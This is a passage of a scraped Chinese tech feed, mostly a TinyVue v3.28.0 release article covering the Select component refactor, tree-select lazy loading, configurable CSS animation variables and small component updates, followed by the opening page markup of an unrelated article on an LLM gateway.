<li>Area 组件本身只是一个很简单的组件，由于引入了 Select，导致产物体积也非常大</li>
</ul>
<h4 data-id="heading-5">重构目标</h4>
<p>本次重构主要达成以下目标：</p>
<ol>
<li>从 Select 组件中**剥离 Tree / Grid 组件，让业务在单引Select组件时不再包含 tree/grid 两个重型组件</li>
<li>减少业务单引Select组件(包括TinyVue组件中依赖了Select的组件)时的包体积，优化性能</li>
<li>重构完不能引起破坏性变更，不能影响现有业务</li>
</ol>
<h4 data-id="heading-6">重构方案</h4>
<p>为了达成以上目标，我们<strong>设计并实行</strong>了以下重构方案：</p>
<ol>
<li>开发一个新组件 <strong>BaseSelect</strong>，这个组件和 Select 组件的api和功能完全一致，只是移除了 tree/grid 相关api和功能</li>
<li><strong>BaseSelect 组件增加panel插槽</strong>，并设计好panel与reference的沟通机制，让用户可以在panel插槽放置任意内容，<strong>包括tree/grid等组件</strong>，从而实现下拉树、下拉表格等功能</li>
<li><strong>基于 BaseSelect 封装 TreeSelect 组件</strong>，实现下拉树组件</li>
<li><strong>基于 BaseSelect 封装 GridSelect 组件</strong>，实现下拉表格组件</li>
<li>重构 Select，移除原有的 tree/grid 功能，基于 BaseSelect / TreeSeelct / GridSelect 组件进行封装，全新的 Select 组件api和功能与原来的Select组件一模一样，不影响用户使用</li>
<li><strong>开发全新select-wrapper包装器</strong>，包含原本select所有功能用于平替</li>
</ol>
<p>重构后组件关系如下图：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc1341d8b04845bf85ee39f1530468ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=HPnXNaJcJvGh4n%2F%2F%2FlwXoGvnHGA%3D" alt="3.png" loading="lazy"/></p>
<h4 data-id="heading-7">业务性能优化</h4>
<p>使用了 Select 组件的业务，如果想要优化性能，可以：</p>
<ul>
<li>只需要Select基本功能的业务，可以通过全局替换 <code>tiny-select</code> 为 <code>tiny-base-select</code> 来实现性能优化</li>
<li>使用了Select组件下拉树功能的业务，可以通过全局替换 <code>tiny-select</code> 为 <code>tiny-tree-select</code> 来实现性能优化</li>
<li>使用了Select组件下拉表格功能的业务，可以通过全局替换 <code>tiny-select</code> 为 <code>tiny-grid-select</code> 来实现性能优化</li>
<li>如果业务同时使用了下拉树和下拉表格功能，则可以使用 SelectWrapper 组件</li>
</ul>
<h4 data-id="heading-8">场景示例</h4>
<p>仅使用base-select与select组件打包对比<strong>包体积减少50%以上</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b31aaef713564e5d994d5f6a573c50a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=YDLQpxcd9IGmBzglsJBWQx%2BRBAM%3D" alt="4.png" loading="lazy"/></p>
<h3 data-id="heading-9">新增功能：懒加载支持</h3>
<p><code>tree-select</code> 现在支持懒加载，想象一下，一个包含 10,000 个节点的树形选择器，以前需要一次性加载所有数据，现在可以按需加载，性能提升不是一点点！</p>
<h4 data-id="heading-10">懒加载的使用场景</h4>
<ol>
<li><strong>大数据量树形结构</strong> - 当树节点数量超过 1000 个时，懒加载可以显著提升性能</li>
<li><strong>动态数据加载</strong> - 数据需要从服务器按需获取</li>
<li><strong>减少初始加载时间</strong> - 只加载用户需要查看的节点</li>
</ol>
<h3 data-id="heading-11">主题动画：一键定制，随心所欲</h3>
<h4 data-id="heading-12">全局动画配置</h4>
<p>为 TinyVue 提供 <strong>全局动效配置能力</strong>，基于 <strong>LESS 与 CSS 变量</strong>，实现以下目标：</p>
<ol>
<li><strong>统一管理</strong>：所有动效集中维护，避免分散定义与重复工作。</li>
<li><strong>全局可控</strong>：通过 CSS 变量统一控制动效的持续时间、延迟、速度等参数。</li>
<li><strong>组件集成</strong>：组件可直接调用统一的动效类名或 <code>@keyframes</code>。</li>
<li><strong>动态可调</strong>：通过覆盖 CSS 变量即可在不同场景下切换动效风格。</li>
</ol>
<h4 data-id="heading-13">全局变量定义</h4>
<p>在 <code>/packages/theme/src/base/vars.less</code> 中统一定义动效变量：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-comment">/* 蚂蚁线相关配置 */</span>
  <span class="hljs-attr">--tv-motion-ants-shift</span>: 8px;
  <span class="hljs-attr">--tv-motion-ants-speed</span>: 0.8s;

  <span class="hljs-comment">/* 其他动效参数... */</span>
}
</code></pre>
<p>开发者可在组件主题文件中覆盖这些变量：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.copyed-borders</span> {
  <span class="hljs-attr">--tv-motion-ants-shift</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attr">--tv-motion-ants-speed</span>: <span class="hljs-number">1.2s</span>;
}
</code></pre>
<p>也可通过在 <code>/packages/theme/src/base/</code> 下创建 <code>motion-theme.less</code> 来切换全局动效风格：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-pseudo">:root</span> {
  <span class="hljs-attr">--tv-motion-ants-shift</span>: 12px;
  <span class="hljs-attr">--tv-motion-ants-speed</span>: 1.2s;
}
</code></pre>
<h4 data-id="heading-14">动效分类与目录结构</h4>
<p>所有动效存放在 /packages/theme/src/motion/ 目录下，按类型拆分：</p>
<pre><code class="hljs language-scss" lang="scss">motion/
  ├─ fade<span class="hljs-selector-class">.less</span>        <span class="hljs-comment">// 淡入淡出</span>
  ├─ slide<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 滑动</span>
  ├─ zoom<span class="hljs-selector-class">.less</span>        <span class="hljs-comment">// 缩放</span>
  ├─ rotate<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 旋转</span>
  ├─ bounce<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 弹跳</span>
  ├─ scroll<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 滚动</span>
  ├─ stroke<span class="hljs-selector-class">.less</span>      <span class="hljs-comment">// 描边</span>
  ├─ shine<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 闪烁</span>
  ├─ ants<span class="hljs-selector-class">.less</span>        <span class="hljs-comment">// 蚂蚁线</span>
  ├─ arrow<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 箭头</span>
  ├─ tab<span class="hljs-selector-class">.less</span>         <span class="hljs-comment">// Tab 切换</span>
  ├─ progress<span class="hljs-selector-class">.less</span>    <span class="hljs-comment">// 进度条</span>
  └─ index<span class="hljs-selector-class">.less</span>       <span class="hljs-comment">// 统一引入</span>
</code></pre>
<h4 data-id="heading-15">动效示例</h4>
<p><strong>1. 淡入淡出 (fade.less)</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-keyword">@keyframes</span> fade-in {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
}

<span class="hljs-keyword">@keyframes</span> fade-out {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; }
}
</code></pre>
<p>组件调用示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.@{fade-prefix-cls}</span> {
  <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">-enter-active</span> {
    <span class="hljs-attribute">animation</span>: <span class="hljs-built_in">var</span>(--tv-motion-fade-speed) fade-in ease-out both;
  }
  <span class="hljs-selector-tag">&amp;</span><span class="hljs-selector-tag">-leave-active</span> {
    <span class="hljs-attribute">animation</span>: <span class="hljs-built_in">var</span>(--tv-motion-fade-speed) fade-out ease-in both;
  }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/23e32a3264c24f4592aca61f393a4709~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=0yDdDHoX9YBWmaZae2br119hQDw%3D" alt="5.gif" loading="lazy"/>
<strong>2. 滑动 (slide.less)</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-keyword">@keyframes</span> slide-left-in {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left)); }
  <span class="hljs-number">50%</span>  { <span class="hljs-attribute">opacity</span>: <span class="hljs-built_in">var</span>(--tv-motion-slide-opacity-mid); <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left-mid)); }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0%</span>); }
}

<span class="hljs-keyword">@keyframes</span> slide-left-out {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">1</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-number">0%</span>); }
  <span class="hljs-number">50%</span>  { <span class="hljs-attribute">opacity</span>: <span class="hljs-built_in">var</span>(--tv-motion-slide-opacity-mid); <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left-mid)); }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateX</span>(<span class="hljs-built_in">var</span>(--tv-motion-slide-offset-left)); }
}
</code></pre>
<p>组件调用示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.drawer-slide-left-enter-active</span> {
  <span class="hljs-attribute">animation</span>: slide-left-in <span class="hljs-built_in">var</span>(--tv-motion-slide-speed) linear;
}
<span class="hljs-selector-class">.drawer-slide-left-leave-active</span> {
  <span class="hljs-attribute">animation</span>: slide-left-out <span class="hljs-built_in">var</span>(--tv-motion-slide-speed) linear;
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ed3ca24e7d94401a1413356ac6b2e88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=8FKQVILamh8l6Jkd5UtcmmZOzN8%3D" alt="6.gif" loading="lazy"/>
<strong>3. 蚂蚁线 (ants.less，可配置)</strong></p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-keyword">@keyframes</span> ants-x {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">background-position</span>: <span class="hljs-built_in">var</span>(--tv-motion-ants-shift, <span class="hljs-number">8px</span>) <span class="hljs-number">0</span>; }
}

<span class="hljs-keyword">@keyframes</span> ants-x-rev {
  <span class="hljs-number">0%</span>   { <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>; }
  <span class="hljs-number">100%</span> { <span class="hljs-attribute">background-position</span>: <span class="hljs-built_in">calc</span>(-<span class="hljs-number">1</span> * <span class="hljs-built_in">var</span>(--tv-motion-ants-shift, <span class="hljs-number">8px</span>)) <span class="hljs-number">0</span>; }
}
</code></pre>
<p>组件调用示例：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-copyed-borders</span> {
  <span class="hljs-attr">--tv-motion-ants-shift</span>: 13px;

  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-top</span> {
    <span class="hljs-attribute">animation</span>: ants-x <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-right</span> {
    <span class="hljs-attribute">animation</span>: ants-y <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-bottom</span> {
    <span class="hljs-attribute">animation</span>: ants-x-rev <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
  <span class="hljs-selector-class">.@{grid-prefix-cls}</span><span class="hljs-selector-tag">-border-left</span> {
    <span class="hljs-attribute">animation</span>: ants-y-rev <span class="hljs-built_in">var</span>(--tv-motion-ants-speed) linear infinite;
  }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8d7fb56f009442aa83f9e8f04b70bd45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=b1d1y5ARbyKqAm5ezeEaYKw8M7A%3D" alt="7.gif" loading="lazy"/></p>
<h4 data-id="heading-16">组件集成方式</h4>
<ol>
<li><strong>全局引入</strong>
所有 <code>@keyframes</code> 在 <code>transition.less</code> 与 <code>motion/*</code> 中集中维护，统一加载。</li>
<li><strong>局部调用</strong>
组件可通过 <code>className</code> 或 <code>animation</code> 调用指定动效。</li>
<li><strong>可配置参数</strong>
开发者可通过覆盖 <code>:root</code> 变量调整动效时长、速度等参数。</li>
</ol>
<h2 data-id="heading-17">四、其他重要更新</h2>
<h3 data-id="heading-18">下拉菜单右键支持</h3>
<p><code>dropdown</code> 组件现在支持右键菜单触发了！这对于需要上下文菜单的场景非常有用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b439382f1d1544c9b07e4d7408bcae2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=Xe5eqh4zjDXN4quIQHOlwnXeALI%3D" alt="8.gif" loading="lazy"/></p>
<h4 data-id="heading-19">使用场景</h4>
<p>右键菜单在很多业务场景中都非常常见：</p>
<ul>
<li><strong>表格行操作</strong> - 在表格行上右键显示操作菜单</li>
<li><strong>文件管理</strong> - 文件列表的右键菜单</li>
<li><strong>编辑器</strong> - 文本编辑器的上下文菜单</li>
<li><strong>图形界面</strong> - 画布元素的右键菜单</li>
</ul>
<h4 data-id="heading-20">支持的触发方式</h4>
<ul>
<li><code>click</code> - 点击触发（默认）</li>
<li><code>hover</code> - 悬停触发</li>
<li><code>contextmenu</code> - 右键触发（新功能）</li>
<li><code>focus</code> - 聚焦触发</li>
</ul>
<h3 data-id="heading-21">Switch 组件宽度自定义</h3>
<p><code>switch</code> 组件现在支持自定义宽度了！不再局限于固定的尺寸。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35bc2a281df04845ac721d5fd6abac27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=amUhUsuF5uhGSkAXEHQx8LkE6Ts%3D" alt="9.png" loading="lazy"/></p>
<h4 data-id="heading-22">使用场景</h4>
<p>自定义宽度让你可以：</p>
<ul>
<li><strong>适配不同设计风格</strong> - 根据 UI 设计调整开关大小</li>
<li><strong>提升视觉层次</strong> - 通过不同尺寸区分重要程度</li>
<li><strong>响应式设计</strong> - 在不同屏幕尺寸下使用不同宽度</li>
<li><strong>样式定制</strong> - 配合 CSS，你可以进一步定制开关的样式</li>
</ul>
<h3 data-id="heading-23">Modal 头部拖拽</h3>
<p><code>modal</code> 组件现在支持设置 <code>headerDragable</code> 属性，让用户可以拖拽弹窗头部来移动弹窗位置。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87c97a8bec3a421dae9ae5dacf0ee344~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=%2FwmnK6grPAxA16vMvhpY%2BPROm7w%3D" alt="10.gif" loading="lazy"/></p>
<h4 data-id="heading-24">使用场景</h4>
<p>拖拽功能特别适合：</p>
<ul>
<li><strong>多窗口场景</strong> - 用户可以自由调整弹窗位置，避免遮挡</li>
<li><strong>大屏幕应用</strong> - 在宽屏显示器上，拖拽可以提升操作效率</li>
<li><strong>用户个性化</strong> - 让用户按照自己的习惯摆放弹窗</li>
</ul>
<h4 data-id="heading-25">注意事项</h4>
<ul>
<li>拖拽功能只在弹窗未全屏时生效</li>
<li>拖拽范围受视口限制，不会拖出屏幕</li>
<li>可以通过 CSS 自定义拖拽时的样式</li>
</ul>
<h3 data-id="heading-26">Drawer 按 ESC 关闭</h3>
<p><code>drawer</code> 组件现在支持通过按 `ESC` 键关闭，用户体验更加友好。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be469b7494f54e1da4393acc91897e8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=ezE6TcXDwTdm44wrnmnAjNujIOQ%3D" alt="11.gif" loading="lazy"/></p>
<h4 data-id="heading-27">使用场景</h4>
<p>ESC 键关闭是用户习惯的操作方式：</p>
<ul>
<li><strong>符合用户预期</strong> - 大多数应用都支持 ESC 关闭</li>
<li><strong>提升操作效率</strong> - 键盘操作比鼠标点击更快</li>
<li><strong>无障碍支持</strong> - 方便键盘用户操作</li>
</ul>
<h4 data-id="heading-28">其他关闭方式</h4>
<p>Drawer 组件支持多种关闭方式：</p>
<ul>
<li>点击遮罩层关闭（默认）</li>
<li>点击关闭按钮</li>
<li>按 ESC 键关闭（新功能）</li>
<li>调用 <code>close()</code> 方法</li>
</ul>
<h3 data-id="heading-29">Tree Menu 节点点击增强</h3>
<p><code>tree-menu</code> 组件现在支持在文档中点击添加节点，交互更加直观。</p>
<h4 data-id="heading-30">使用场景</h4>
<p>这个功能特别适合：</p>
<ul>
<li><strong>可视化编辑</strong> - 在文档中直接点击添加节点</li>
<li><strong>快速操作</strong> - 提升节点添加的效率</li>
<li><strong>直观交互</strong> - 所见即所得的编辑体验</li>
</ul>
<h3 data-id="heading-31">Guide 组件触发条件优化</h3>
<p>guide<code>组件现在支持</code>showStep<code>属性，只有在</code>showStep<code>为</code>true` 时才会触发引导。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b40e65bbb19d45a5b0c6a826a8b4405d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT3BlblRpbnnnpL7ljLo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770704241&amp;x-signature=bvLBbtPiUen2787qUVBx3J2Nsgc%3D" alt="12.gif" loading="lazy"/></p>
<h4 data-id="heading-32">使用场景</h4>
<p>这个优化让你可以：</p>
<ul>
<li><strong>条件触发</strong> - 只在特定条件下显示引导</li>
<li><strong>避免干扰</strong> - 不会在用户不需要时弹出</li>
<li><strong>灵活控制</strong> - 根据业务逻辑动态控制引导显示</li>
</ul>
<h2 data-id="heading-33">五、结语</h2>
<p>TinyVue v3.28.0 版本的发布，实现了多项重要升级：对选择器组件家族进行了彻底重构，解耦了 Tree / Grid 等重型功能，显著降低了单个组件的体积；新增了全局主题动画配置，让动画效果可通过 CSS 变量随意定制；引入了懒加载、右键菜单、宽度自定义、弹窗拖拽、ESC 关闭等实用功能，进一步提升了开发体验和用户交互；同时修复了 65+ 个 Bug，整体稳定性大幅提升。通过这些改进，TinyVue 不仅在性能上实现了突破，也为开发者提供了更灵活、可维护的组件库，期待在未来的项目中为你带来更高效、更优雅的开发体验，让我们一起，让前端开发变得更简单、更高效！</p>
<h2 data-id="heading-34">关于OpenTiny</h2>
<p>欢迎加入 OpenTiny 开源社区。添加微信小助手：opentiny-official 一起参与交流前端技术～<br/>
OpenTiny 官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design" target="_blank" title="https://opentiny.design" ref="nofollow noopener noreferrer">opentiny.design</a><br/>
OpenTiny 代码仓库：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny" target="_blank" title="https://github.com/opentiny" ref="nofollow noopener noreferrer">github.com/opentiny</a><br/>
TinyVue源码：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue" target="_blank" title="https://github.com/opentiny/tiny-vue" ref="nofollow noopener noreferrer">github.com/opentiny/ti…</a></p>
<p>欢迎进入代码仓库 Star🌟TinyVue、TinyEngine、TinyPro、TinyNG、TinyCLI、TinyEditor
如果你也想要共建，可以进入代码仓库，找到 good first issue标签，一起参与开源贡献~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大模型网关：大模型时代的智能交通枢纽｜得物技术]]></title>    <link>https://juejin.cn/post/7602135278666055732</link>    <guid>https://juejin.cn/post/7602135278666055732</guid>    <pubDate>2026-02-03T06:18:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278666055732" data-draft-id="7602252722373607475" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大模型网关：大模型时代的智能交通枢纽｜得物技术"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-03T06:18:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="得物技术"/> <meta itemprop="url" content="https://juejin.cn/user/2392954206960247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大模型网关：大模型时代的智能交通枢纽｜得物技术
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2392954206960247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    得物技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:18:39.000Z" title="Tue Feb 03 2026 06:18:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIE